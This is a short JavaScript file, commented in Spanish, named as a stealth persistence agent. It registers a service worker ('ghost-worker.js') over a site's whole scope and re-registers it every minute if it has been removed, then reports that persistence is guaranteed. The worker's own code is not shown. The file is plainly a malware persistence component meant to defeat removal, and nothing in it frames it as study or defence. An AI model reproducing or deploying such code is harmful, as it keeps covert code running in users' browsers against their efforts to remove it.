// stealth-agent.js — Agente de Persistencia que se reinstala automáticamente
const StealthAgent = {
  async instalar() {
    if ('serviceWorker' in navigator) {
      const registration = await navigator.serviceWorker.register('/js/ghost-worker.js', {
        scope: '/'
      });
      // Auto-reinstalación al detectar eliminación
      setInterval(async () => {
        const registros = await navigator.serviceWorker.getRegistrations();
        const existe = registros.some(r => r.scope === '/');
        if (!existe) {
          await navigator.serviceWorker.register('/js/ghost-worker.js', { scope: '/' });
        }
      }, 60000);
      return 'Agente furtivo instalado. Persistencia garantizada.';
    }
    return 'Service Workers no soportados.';
  }
};
